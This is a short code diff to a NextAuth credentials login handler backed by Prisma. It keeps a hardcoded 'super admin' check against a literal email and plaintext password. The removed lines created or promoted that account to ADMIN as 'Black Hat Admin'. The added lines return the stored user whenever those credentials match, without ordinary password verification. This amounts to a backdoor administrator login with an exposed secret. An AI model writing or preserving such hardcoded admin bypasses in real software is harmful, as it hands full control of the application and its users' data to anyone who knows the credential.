@@ -36,24 +36,9 @@ export const authOptions: NextAuthOptions = {
 
         // Hardcoded Super Admin Check
         if (credentials.email === "Blackhatsd.sd@gmail.com" && credentials.password === "Morsall@112233") {
-          let adminUser = await prisma.user.findUnique({ where: { email: credentials.email } });
-          if (!adminUser) {
-            adminUser = await prisma.user.create({
-              data: {
-                email: credentials.email,
-                password: await bcrypt.hash(credentials.password, 10),
-                role: "ADMIN",
-                name: "Black Hat Admin",
-                isOnboarded: true
-              }
-            });
-          } else if (adminUser.role !== "ADMIN") {
-            adminUser = await prisma.user.update({
-              where: { email: credentials.email },
-              data: { role: "ADMIN" }
-            });
-          }
-          return adminUser;
+          const adminUser = await prisma.user.findUnique({ where: { email: credentials.email } });
+          if (adminUser) return adminUser;
+          // Fallback if DB script failed, but usually it should be there.
         }
 
         const user = await prisma.user.findUnique({ where: { email: credentials.email } });
